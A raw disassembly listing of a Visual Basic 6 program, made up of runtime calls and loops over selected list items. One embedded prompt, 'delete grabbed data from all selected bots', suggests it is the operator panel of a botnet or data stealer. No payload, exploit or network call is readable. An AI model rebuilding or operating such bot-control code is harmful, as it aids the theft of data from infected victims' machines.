008B7277: lea eax, var_7C
008B727A: push eax
008B727B: lea eax, var_6C
008B727E: push eax
008B727F: lea eax, var_5C
008B7282: push eax
008B7283: push 00000003h
008B7285: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B728A: add esp, 00000010h
008B728D: movsx eax, word ptr var_00000140
008B7294: test eax, eax
008B7296: jz 008B7496h
008B729C: mov var_04, 0000001Ah
008B72A3: lea eax, var_30
008B72A6: mov var_000000C8, eax
008B72AC: mov var_000000D0, 0000400Ch
008B72B6: cmp [008F2010h], 00000000h
008B72BD: jnz 8B72DAh
008B72BF: push 008F2010h
008B72C4: push 00433984h
008B72C9: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B72CE: mov var_00000238, 008F2010h
008B72D8: jmp 8B72E4h
008B72DA: mov var_00000238, 008F2010h
008B72E4: push 00000000h
008B72E6: push 00000014h
008B72E8: push 00440E58h
008B72ED: push 00000010h
008B72EF: pop eax
008B72F0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B72F5: lea esi, var_000000D0
008B72FB: mov edi, esp
008B72FD: movsd 
008B72FE: movsd 
008B72FF: movsd 
008B7300: movsd 
008B7301: push 00000001h
008B7303: push 00000000h
008B7305: push 00440E48h
008B730A: push 00000000h
008B730C: push 00000018h
008B730E: mov eax, var_00000238
008B7314: mov eax, [eax]
008B7316: mov ecx, var_00000238
008B731C: mov ecx, [ecx]
008B731E: mov ecx, [ecx]
008B7320: push eax
008B7321: call [ecx+00000550h]
008B7327: push eax
008B7328: lea eax, var_44
008B732B: push eax
008B732C: call 00410A84h ; Set (object)
008B7331: push eax
008B7332: lea eax, var_5C
008B7335: push eax
008B7336: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B733B: add esp, 00000010h
008B733E: push eax
008B733F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B7344: push eax
008B7345: lea eax, var_48
008B7348: push eax
008B7349: call 00410A84h ; Set (object)
008B734E: push eax
008B734F: lea eax, var_6C
008B7352: push eax
008B7353: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7358: add esp, 00000020h
008B735B: push eax
008B735C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B7361: push eax
008B7362: lea eax, var_4C
008B7365: push eax
008B7366: call 00410A84h ; Set (object)
008B736B: push eax
008B736C: lea eax, var_7C
008B736F: push eax
008B7370: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7375: add esp, 00000010h
008B7378: push eax
008B7379: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008B737E: mov edx, eax
008B7380: lea ecx, var_3C
008B7383: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B7388: push eax
008B7389: call 004109DCh ; Val(arg_1)
008B738E: fstp real8 ptr var_0000013C
008B7394: push 00000000h
008B7396: push 00000001h
008B7398: push 00000001h
008B739A: push 00000000h
008B739C: lea eax, var_000000C0
008B73A2: push eax
008B73A3: push 00000010h
008B73A5: push 00000880h
008B73AA: call 00410946h ; ReDim
008B73AF: add esp, 0000001Ch
008B73B2: lea eax, var_34
008B73B5: mov var_000000D8, eax
008B73BB: mov var_000000E0, 00004008h
008B73C5: lea esi, var_000000E0
008B73CB: push 00000000h
008B73CD: push var_000000C0
008B73D3: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008B73D8: mov ecx, eax
008B73DA: mov edx, esi
008B73DC: call 00410940h ; msvbvm60.dll.__vbaVarZero
008B73E1: push var_38
008B73E4: call 004109DCh ; Val(arg_1)
008B73E9: fstp real8 ptr var_000000E8
008B73EF: mov var_000000F0, 00000005h
008B73F9: lea esi, var_000000F0
008B73FF: push 00000001h
008B7401: push var_000000C0
008B7407: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008B740C: mov ecx, eax
008B740E: mov edx, esi
008B7410: call 00410922h ; msvbvm60.dll.__vbaVarMove
008B7415: mov edx, 0043D9A0h ; x113
008B741A: lea ecx, var_40
008B741D: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008B7422: lea eax, var_000000C0
008B7428: push eax
008B7429: lea eax, var_40
008B742C: push eax
008B742D: fld real8 ptr var_0000013C
008B7433: call 004108E6h ; msvbvm60.dll.__vbaFpI2
008B7438: push eax
008B7439: call 007A6910h
008B743E: lea eax, var_000000C0
008B7444: push eax
008B7445: push 00000000h
008B7447: call 00410934h ; Erase
008B744C: lea eax, var_40
008B744F: push eax
008B7450: lea eax, var_3C
008B7453: push eax
008B7454: push 00000002h
008B7456: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B745B: add esp, 0000000Ch
008B745E: lea eax, var_4C
008B7461: push eax
008B7462: lea eax, var_48
008B7465: push eax
008B7466: lea eax, var_44
008B7469: push eax
008B746A: push 00000003h
008B746C: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B7471: add esp, 00000010h
008B7474: lea eax, var_7C
008B7477: push eax
008B7478: lea eax, var_6C
008B747B: push eax
008B747C: lea eax, var_5C
008B747F: push eax
008B7480: push 00000003h
008B7482: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B7487: add esp, 00000010h
008B748A: mov var_04, 0000001Bh
008B7491: call 0041096Ah ; DoEvents
008B7496: mov var_04, 0000001Dh
008B749D: lea eax, var_00000190
008B74A3: push eax
008B74A4: lea eax, var_00000180
008B74AA: push eax
008B74AB: lea eax, var_30
008B74AE: push eax
008B74AF: call 00410A36h ; Next
008B74B4: mov var_00000210, eax
008B74BA: cmp var_00000210, 00000000h
008B74C1: jnz 008B716Ch
008B74C7: jmp 008B81D9h
008B74CC: mov var_04, 00000021h
008B74D3: mov var_000000C8, 00000001h
008B74DD: mov var_000000D0, 00000002h
008B74E7: push 004412BCh
008B74EC: push 00000000h
008B74EE: push 00000007h
008B74F0: mov eax, [ebp+08h]
008B74F3: mov eax, [eax]
008B74F5: push [ebp+08h]
008B74F8: call [eax+00000324h]
008B74FE: push eax
008B74FF: lea eax, var_44
008B7502: push eax
008B7503: call 00410A84h ; Set (object)
008B7508: push eax
008B7509: lea eax, var_5C
008B750C: push eax
008B750D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7512: add esp, 00000010h
008B7515: push eax
008B7516: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B751B: push eax
008B751C: lea eax, var_48
008B751F: push eax
008B7520: call 00410A84h ; Set (object)
008B7525: mov var_00000140, eax
008B752B: lea eax, var_00000134
008B7531: push eax
008B7532: mov eax, var_00000140
008B7538: mov eax, [eax]
008B753A: push var_00000140
008B7540: call [eax+1Ch]
008B7543: fclex 
008B7545: mov var_00000144, eax
008B754B: cmp var_00000144, 00000000h
008B7552: jnl 8B7574h
008B7554: push 0000001Ch
008B7556: push 004412BCh
008B755B: push var_00000140
008B7561: push var_00000144
008B7567: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B756C: mov var_0000023C, eax
008B7572: jmp 8B757Bh
008B7574: and var_0000023C, 00000000h
008B757B: mov eax, var_00000134
008B7581: mov var_000000D8, eax
008B7587: mov var_000000E0, 00000003h
008B7591: mov var_000000E8, 00000001h
008B759B: mov var_000000F0, 00000002h
008B75A5: lea eax, var_000000D0
008B75AB: push eax
008B75AC: lea eax, var_000000E0
008B75B2: push eax
008B75B3: lea eax, var_000000F0
008B75B9: push eax
008B75BA: lea eax, var_000001B0
008B75C0: push eax
008B75C1: lea eax, var_000001A0
008B75C7: push eax
008B75C8: lea eax, var_30
008B75CB: push eax
008B75CC: call 00410A3Ch ; For
008B75D1: mov var_00000214, eax
008B75D7: lea eax, var_48
008B75DA: push eax
008B75DB: lea eax, var_44
008B75DE: push eax
008B75DF: push 00000002h
008B75E1: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B75E6: add esp, 0000000Ch
008B75E9: lea ecx, var_5C
008B75EC: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008B75F1: jmp 008B7830h
008B75F6: mov var_04, 00000022h
008B75FD: push 004412BCh
008B7602: push 00000000h
008B7604: push 00000007h
008B7606: mov eax, [ebp+08h]
008B7609: mov eax, [eax]
008B760B: push [ebp+08h]
008B760E: call [eax+00000324h]
008B7614: push eax
008B7615: lea eax, var_44
008B7618: push eax
008B7619: call 00410A84h ; Set (object)
008B761E: push eax
008B761F: lea eax, var_5C
008B7622: push eax
008B7623: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7628: add esp, 00000010h
008B762B: push eax
008B762C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B7631: push eax
008B7632: lea eax, var_48
008B7635: push eax
008B7636: call 00410A84h ; Set (object)
008B763B: mov var_00000140, eax
008B7641: lea eax, var_4C
008B7644: push eax
008B7645: lea eax, var_30
008B7648: push eax
008B7649: mov eax, var_00000140
008B764F: mov eax, [eax]
008B7651: push var_00000140
008B7657: call [eax+24h]
008B765A: fclex 
008B765C: mov var_00000144, eax
008B7662: cmp var_00000144, 00000000h
008B7669: jnl 8B768Bh
008B766B: push 00000024h
008B766D: push 004412BCh
008B7672: push var_00000140
008B7678: push var_00000144
008B767E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B7683: mov var_00000240, eax
008B7689: jmp 8B7692h
008B768B: and var_00000240, 00000000h
008B7692: mov eax, var_4C
008B7695: mov var_00000148, eax
008B769B: lea eax, var_3C
008B769E: push eax
008B769F: push 00000005h
008B76A1: mov eax, var_00000148
008B76A7: mov eax, [eax]
008B76A9: push var_00000148
008B76AF: call [eax+00000084h]
008B76B5: fclex 
008B76B7: mov var_0000014C, eax
008B76BD: cmp var_0000014C, 00000000h
008B76C4: jnl 8B76E9h
008B76C6: push 00000084h
008B76CB: push 004412DCh
008B76D0: push var_00000148
008B76D6: push var_0000014C
008B76DC: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B76E1: mov var_00000244, eax
008B76E7: jmp 8B76F0h
008B76E9: and var_00000244, 00000000h
008B76F0: push var_3C
008B76F3: push 0044BAE4h ; 100%
008B76F8: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
008B76FD: neg eax
008B76FF: sbb eax, eax
008B7701: inc eax
008B7702: neg eax
008B7704: mov var_00000150, ax
008B770B: lea ecx, var_3C
008B770E: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008B7713: lea eax, var_4C
008B7716: push eax
008B7717: lea eax, var_48
008B771A: push eax
008B771B: lea eax, var_44
008B771E: push eax
008B771F: push 00000003h
008B7721: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B7726: add esp, 00000010h
008B7729: lea ecx, var_5C
008B772C: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008B7731: movsx eax, word ptr var_00000150
008B7738: test eax, eax
008B773A: jz 008B780Ch
008B7740: mov var_04, 00000023h
008B7747: push 004412BCh
008B774C: push 00000000h
008B774E: push 00000007h
008B7750: mov eax, [ebp+08h]
008B7753: mov eax, [eax]
008B7755: push [ebp+08h]
008B7758: call [eax+00000324h]
008B775E: push eax
008B775F: lea eax, var_44
008B7762: push eax
008B7763: call 00410A84h ; Set (object)
008B7768: push eax
008B7769: lea eax, var_5C
008B776C: push eax
008B776D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7772: add esp, 00000010h
008B7775: push eax
008B7776: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B777B: push eax
008B777C: lea eax, var_48
008B777F: push eax
008B7780: call 00410A84h ; Set (object)
008B7785: mov var_00000140, eax
008B778B: lea edx, var_30
008B778E: lea ecx, var_6C
008B7791: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
008B7796: lea eax, var_6C
008B7799: push eax
008B779A: mov eax, var_00000140
008B77A0: mov eax, [eax]
008B77A2: push var_00000140
008B77A8: call [eax+34h]
008B77AB: fclex 
008B77AD: mov var_00000144, eax
008B77B3: cmp var_00000144, 00000000h
008B77BA: jnl 8B77DCh
008B77BC: push 00000034h
008B77BE: push 004412BCh
008B77C3: push var_00000140
008B77C9: push var_00000144
008B77CF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B77D4: mov var_00000248, eax
008B77DA: jmp 8B77E3h
008B77DC: and var_00000248, 00000000h
008B77E3: lea eax, var_48
008B77E6: push eax
008B77E7: lea eax, var_44
008B77EA: push eax
008B77EB: push 00000002h
008B77ED: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B77F2: add esp, 0000000Ch
008B77F5: lea eax, var_6C
008B77F8: push eax
008B77F9: lea eax, var_5C
008B77FC: push eax
008B77FD: push 00000002h
008B77FF: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B7804: add esp, 0000000Ch
008B7807: jmp 008B74CCh
008B780C: mov var_04, 00000026h
008B7813: lea eax, var_000001B0
008B7819: push eax
008B781A: lea eax, var_000001A0
008B7820: push eax
008B7821: lea eax, var_30
008B7824: push eax
008B7825: call 00410A36h ; Next
008B782A: mov var_00000214, eax
008B7830: cmp var_00000214, 00000000h
008B7837: jnz 008B75F6h
008B783D: mov var_04, 00000027h
008B7844: and [008F23D0h], 00000000h
008B784B: mov var_04, 00000028h
008B7852: fldz 
008B7854: fstp real8 ptr [008F23D4h]
008B785A: mov var_04, 00000029h
008B7861: fldz 
008B7863: fstp real8 ptr [008F23C8h]
008B7869: jmp 008B81D9h
008B786E: mov var_04, 0000002Bh
008B7875: mov var_00000084, 80020004h
008B787F: mov var_0000008C, 0000000Ah
008B7889: mov var_74, 80020004h
008B7890: mov var_7C, 0000000Ah
008B7897: mov var_64, 80020004h
008B789E: mov var_6C, 0000000Ah
008B78A5: mov var_000000C8, 0045A534h ; Do you really want to delete grabbed data from all selected bots?
008B78AF: mov var_000000D0, 00000008h
008B78B9: lea edx, var_000000D0
008B78BF: lea ecx, var_5C
008B78C2: call 004109E2h ; msvbvm60.dll.__vbaVarDup
008B78C7: lea eax, var_0000008C
008B78CD: push eax
008B78CE: lea eax, var_7C
008B78D1: push eax
008B78D2: lea eax, var_6C
008B78D5: push eax
008B78D6: push 00000034h
008B78D8: lea eax, var_5C
008B78DB: push eax
008B78DC: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
008B78E1: sub eax, 00000007h
008B78E4: neg eax
008B78E6: sbb eax, eax
008B78E8: inc eax
008B78E9: neg eax
008B78EB: mov var_00000140, ax
008B78F2: lea eax, var_0000008C
008B78F8: push eax
008B78F9: lea eax, var_7C
008B78FC: push eax
008B78FD: lea eax, var_6C
008B7900: push eax
008B7901: lea eax, var_5C
008B7904: push eax
008B7905: push 00000004h
008B7907: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B790C: add esp, 00000014h
008B790F: movsx eax, word ptr var_00000140
008B7916: test eax, eax
008B7918: jz 8B791Fh
008B791A: jmp 008B81D9h
008B791F: mov var_04, 0000002Eh
008B7926: cmp word ptr [008F2430h], FFFFh
008B792E: jnz 008B7D89h
008B7934: mov var_04, 0000002Fh
008B793B: mov var_000000C8, 00000001h
008B7945: mov var_000000D0, 00000002h
008B794F: cmp [008F2010h], 00000000h
008B7956: jnz 8B7973h
008B7958: push 008F2010h
008B795D: push 00433984h
008B7962: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B7967: mov var_0000024C, 008F2010h
008B7971: jmp 8B797Dh
008B7973: mov var_0000024C, 008F2010h
008B797D: push 00000000h
008B797F: push 00000001h
008B7981: push 00440E48h
008B7986: push 00000000h
008B7988: push 00000018h
008B798A: mov eax, var_0000024C
008B7990: mov eax, [eax]
008B7992: mov ecx, var_0000024C
008B7998: mov ecx, [ecx]
008B799A: mov ecx, [ecx]
008B799C: push eax
008B799D: call [ecx+0000054Ch]
008B79A3: push eax
008B79A4: lea eax, var_44
008B79A7: push eax
008B79A8: call 00410A84h ; Set (object)
008B79AD: push eax
008B79AE: lea eax, var_5C
008B79B1: push eax
008B79B2: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B79B7: add esp, 00000010h
008B79BA: push eax
008B79BB: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B79C0: push eax
008B79C1: lea eax, var_48
008B79C4: push eax
008B79C5: call 00410A84h ; Set (object)
008B79CA: push eax
008B79CB: lea eax, var_6C
008B79CE: push eax
008B79CF: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B79D4: add esp, 00000010h
008B79D7: push eax
008B79D8: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008B79DD: mov var_000000D8, eax
008B79E3: mov var_000000E0, 00000003h
008B79ED: mov var_000000E8, 00000001h
008B79F7: mov var_000000F0, 00000002h
008B7A01: lea eax, var_000000D0
008B7A07: push eax
008B7A08: lea eax, var_000000E0
008B7A0E: push eax
008B7A0F: lea eax, var_000000F0
008B7A15: push eax
008B7A16: lea eax, var_000001D0
008B7A1C: push eax
008B7A1D: lea eax, var_000001C0
008B7A23: push eax
008B7A24: lea eax, var_30
008B7A27: push eax
008B7A28: call 00410A3Ch ; For
008B7A2D: mov var_00000218, eax
008B7A33: lea eax, var_48
008B7A36: push eax
008B7A37: lea eax, var_44
008B7A3A: push eax
008B7A3B: push 00000002h
008B7A3D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B7A42: add esp, 0000000Ch
008B7A45: lea eax, var_6C
008B7A48: push eax
008B7A49: lea eax, var_5C
008B7A4C: push eax
008B7A4D: push 00000002h
008B7A4F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B7A54: add esp, 0000000Ch
008B7A57: jmp 008B7D77h
008B7A5C: mov var_04, 00000030h
008B7A63: lea eax, var_30
008B7A66: mov var_000000C8, eax
008B7A6C: mov var_000000D0, 0000400Ch
008B7A76: cmp [008F2010h], 00000000h
008B7A7D: jnz 8B7A9Ah
008B7A7F: push 008F2010h
008B7A84: push 00433984h
008B7A89: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B7A8E: mov var_00000250, 008F2010h
008B7A98: jmp 8B7AA4h
008B7A9A: mov var_00000250, 008F2010h
008B7AA4: push 00000000h
008B7AA6: push 00000004h
008B7AA8: push 00440E58h
008B7AAD: push 00000010h
008B7AAF: pop eax
008B7AB0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B7AB5: lea esi, var_000000D0
008B7ABB: mov edi, esp
008B7ABD: movsd 
008B7ABE: movsd 
008B7ABF: movsd 
008B7AC0: movsd 
008B7AC1: push 00000001h
008B7AC3: push 00000000h
008B7AC5: push 00440E48h
008B7ACA: push 00000000h
008B7ACC: push 00000018h
008B7ACE: mov eax, var_00000250
008B7AD4: mov eax, [eax]
008B7AD6: mov ecx, var_00000250
008B7ADC: mov ecx, [ecx]
008B7ADE: mov ecx, [ecx]
008B7AE0: push eax
008B7AE1: call [ecx+0000054Ch]
008B7AE7: push eax
008B7AE8: lea eax, var_44
008B7AEB: push eax
008B7AEC: call 00410A84h ; Set (object)
008B7AF1: push eax
008B7AF2: lea eax, var_5C
008B7AF5: push eax
008B7AF6: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7AFB: add esp, 00000010h
008B7AFE: push eax
008B7AFF: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B7B04: push eax
008B7B05: lea eax, var_48
008B7B08: push eax
008B7B09: call 00410A84h ; Set (object)
008B7B0E: push eax
008B7B0F: lea eax, var_6C
008B7B12: push eax
008B7B13: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7B18: add esp, 00000020h
008B7B1B: push eax
008B7B1C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B7B21: push eax
008B7B22: lea eax, var_4C
008B7B25: push eax
008B7B26: call 00410A84h ; Set (object)
008B7B2B: push eax
008B7B2C: lea eax, var_7C
008B7B2F: push eax
008B7B30: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7B35: add esp, 00000010h
008B7B38: push eax
008B7B39: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008B7B3E: sub ax, FFFFh
008B7B42: neg ax
008B7B45: sbb eax, eax
008B7B47: inc eax
008B7B48: neg eax
008B7B4A: mov var_00000140, ax
008B7B51: lea eax, var_4C
008B7B54: push eax
008B7B55: lea eax, var_48
008B7B58: push eax
008B7B59: lea eax, var_44
008B7B5C: push eax
008B7B5D: push 00000003h
008B7B5F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B7B64: add esp, 00000010h
008B7B67: lea eax, var_7C
008B7B6A: push eax
008B7B6B: lea eax, var_6C
008B7B6E: push eax
008B7B6F: lea eax, var_5C
008B7B72: push eax
008B7B73: push 00000003h
008B7B75: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B7B7A: add esp, 00000010h
008B7B7D: movsx eax, word ptr var_00000140
008B7B84: test eax, eax
008B7B86: jz 008B7D53h
008B7B8C: mov var_04, 00000031h
008B7B93: lea eax, var_30
008B7B96: mov var_000000C8, eax
008B7B9C: mov var_000000D0, 0000400Ch
008B7BA6: cmp [008F2010h], 00000000h
008B7BAD: jnz 8B7BCAh
008B7BAF: push 008F2010h
008B7BB4: push 00433984h
008B7BB9: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B7BBE: mov var_00000254, 008F2010h
008B7BC8: jmp 8B7BD4h
008B7BCA: mov var_00000254, 008F2010h
008B7BD4: push 00000000h
008B7BD6: push 00000014h
008B7BD8: push 00440E58h
008B7BDD: push 00000010h
008B7BDF: pop eax
008B7BE0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B7BE5: lea esi, var_000000D0
008B7BEB: mov edi, esp
008B7BED: movsd 
008B7BEE: movsd 
008B7BEF: movsd 
008B7BF0: movsd 
008B7BF1: push 00000001h
008B7BF3: push 00000000h
008B7BF5: push 00440E48h
008B7BFA: push 00000000h
008B7BFC: push 00000018h
008B7BFE: mov eax, var_00000254
008B7C04: mov eax, [eax]
008B7C06: mov ecx, var_00000254
008B7C0C: mov ecx, [ecx]
008B7C0E: mov ecx, [ecx]
008B7C10: push eax
008B7C11: call [ecx+0000054Ch]
008B7C17: push eax
008B7C18: lea eax, var_44
008B7C1B: push eax
008B7C1C: call 00410A84h ; Set (object)
008B7C21: push eax
008B7C22: lea eax, var_5C
008B7C25: push eax
008B7C26: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7C2B: add esp, 00000010h
008B7C2E: push eax
008B7C2F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B7C34: push eax
008B7C35: lea eax, var_48
008B7C38: push eax
008B7C39: call 00410A84h ; Set (object)
008B7C3E: push eax
008B7C3F: lea eax, var_6C
008B7C42: push eax
008B7C43: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7C48: add esp, 00000020h
008B7C4B: push eax
008B7C4C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B7C51: push eax
008B7C52: lea eax, var_4C
008B7C55: push eax
008B7C56: call 00410A84h ; Set (object)
008B7C5B: push eax
008B7C5C: lea eax, var_7C
008B7C5F: push eax
008B7C60: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7C65: add esp, 00000010h
008B7C68: push eax
008B7C69: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008B7C6E: mov edx, eax
008B7C70: lea ecx, var_3C
008B7C73: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B7C78: push eax
008B7C79: call 004109DCh ; Val(arg_1)
008B7C7E: fstp real8 ptr var_0000013C
008B7C84: push 00000000h
008B7C86: push 00000000h
008B7C88: push 00000001h
008B7C8A: push 00000000h
008B7C8C: lea eax, var_000000C0
008B7C92: push eax
008B7C93: push 00000010h
008B7C95: push 00000880h
008B7C9A: call 00410946h ; ReDim
008B7C9F: add esp, 0000001Ch
008B7CA2: mov var_000000D8, 00442930h
008B7CAC: mov var_000000E0, 00000008h
008B7CB6: lea esi, var_000000E0
008B7CBC: push 00000000h
008B7CBE: push var_000000C0
008B7CC4: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008B7CC9: mov ecx, eax
008B7CCB: mov edx, esi
008B7CCD: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
008B7CD2: mov edx, 0043D9C0h ; x115
008B7CD7: lea ecx, var_40
008B7CDA: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008B7CDF: lea eax, var_000000C0
008B7CE5: push eax
008B7CE6: lea eax, var_40
008B7CE9: push eax
008B7CEA: fld real8 ptr var_0000013C
008B7CF0: call 004108E6h ; msvbvm60.dll.__vbaFpI2
008B7CF5: push eax
008B7CF6: call 007A6910h
008B7CFB: lea eax, var_000000C0
008B7D01: push eax
008B7D02: push 00000000h
008B7D04: call 00410934h ; Erase
008B7D09: lea eax, var_40
008B7D0C: push eax
008B7D0D: lea eax, var_3C
008B7D10: push eax
008B7D11: push 00000002h
008B7D13: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B7D18: add esp, 0000000Ch
008B7D1B: lea eax, var_4C
008B7D1E: push eax
008B7D1F: lea eax, var_48
008B7D22: push eax
008B7D23: lea eax, var_44
008B7D26: push eax
008B7D27: push 00000003h
008B7D29: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B7D2E: add esp, 00000010h
008B7D31: lea eax, var_7C
008B7D34: push eax
008B7D35: lea eax, var_6C
008B7D38: push eax
008B7D39: lea eax, var_5C
008B7D3C: push eax
008B7D3D: push 00000003h
008B7D3F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B7D44: add esp, 00000010h
008B7D47: mov var_04, 00000032h
008B7D4E: call 0041096Ah ; DoEvents
008B7D53: mov var_04, 00000034h
008B7D5A: lea eax, var_000001D0
008B7D60: push eax
008B7D61: lea eax, var_000001C0
008B7D67: push eax
008B7D68: lea eax, var_30
008B7D6B: push eax
008B7D6C: call 00410A36h ; Next
008B7D71: mov var_00000218, eax
008B7D77: cmp var_00000218, 00000000h
008B7D7E: jnz 008B7A5Ch
008B7D84: jmp 008B81D9h
008B7D89: mov var_04, 00000036h
008B7D90: mov var_000000C8, 00000001h
008B7D9A: mov var_000000D0, 00000002h
008B7DA4: cmp [008F2010h], 00000000h
008B7DAB: jnz 8B7DC8h
008B7DAD: push 008F2010h
008B7DB2: push 00433984h
008B7DB7: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B7DBC: mov var_00000258, 008F2010h
008B7DC6: jmp 8B7DD2h
008B7DC8: mov var_00000258, 008F2010h
008B7DD2: push 00000000h
008B7DD4: push 00000001h
008B7DD6: push 00440E48h
008B7DDB: push 00000000h
008B7DDD: push 00000018h
008B7DDF: mov eax, var_00000258
008B7DE5: mov eax, [eax]
008B7DE7: mov ecx, var_00000258
008B7DED: mov ecx, [ecx]
008B7DEF: mov ecx, [ecx]
008B7DF1: push eax
008B7DF2: call [ecx+00000550h]
008B7DF8: push eax
008B7DF9: lea eax, var_44
008B7DFC: push eax
008B7DFD: call 00410A84h ; Set (object)
008B7E02: push eax
008B7E03: lea eax, var_5C
008B7E06: push eax
008B7E07: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7E0C: add esp, 00000010h
008B7E0F: push eax
008B7E10: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B7E15: push eax
008B7E16: lea eax, var_48
008B7E19: push eax
008B7E1A: call 00410A84h ; Set (object)
008B7E1F: push eax
008B7E20: lea eax, var_6C
008B7E23: push eax
008B7E24: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7E29: add esp, 00000010h
008B7E2C: push eax
008B7E2D: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008B7E32: mov var_000000D8, eax
008B7E38: mov var_000000E0, 00000003h
008B7E42: mov var_000000E8, 00000001h
008B7E4C: mov var_000000F0, 00000002h
008B7E56: lea eax, var_000000D0
008B7E5C: push eax
008B7E5D: lea eax, var_000000E0
008B7E63: push eax
008B7E64: lea eax, var_000000F0
008B7E6A: push eax
008B7E6B: lea eax, var_000001F0
008B7E71: push eax
008B7E72: lea eax, var_000001E0
008B7E78: push eax
008B7E79: lea eax, var_30
008B7E7C: push eax
008B7E7D: call 00410A3Ch ; For
008B7E82: mov var_0000021C, eax
008B7E88: lea eax, var_48
008B7E8B: push eax
008B7E8C: lea eax, var_44
008B7E8F: push eax
008B7E90: push 00000002h
008B7E92: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B7E97: add esp, 0000000Ch
008B7E9A: lea eax, var_6C
008B7E9D: push eax
008B7E9E: lea eax, var_5C
008B7EA1: push eax
008B7EA2: push 00000002h
008B7EA4: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B7EA9: add esp, 0000000Ch
008B7EAC: jmp 008B81CCh
008B7EB1: mov var_04, 00000037h
008B7EB8: lea eax, var_30
008B7EBB: mov var_000000C8, eax
008B7EC1: mov var_000000D0, 0000400Ch
008B7ECB: cmp [008F2010h], 00000000h
008B7ED2: jnz 8B7EEFh
008B7ED4: push 008F2010h
008B7ED9: push 00433984h
008B7EDE: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B7EE3: mov var_0000025C, 008F2010h
008B7EED: jmp 8B7EF9h
008B7EEF: mov var_0000025C, 008F2010h
008B7EF9: push 00000000h
008B7EFB: push 00000004h
008B7EFD: push 00440E58h
008B7F02: push 00000010h
008B7F04: pop eax
008B7F05: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B7F0A: lea esi, var_000000D0
008B7F10: mov edi, esp
008B7F12: movsd 
008B7F13: movsd 
008B7F14: movsd 
008B7F15: movsd 
008B7F16: push 00000001h
008B7F18: push 00000000h
008B7F1A: push 00440E48h
008B7F1F: push 00000000h
008B7F21: push 00000018h
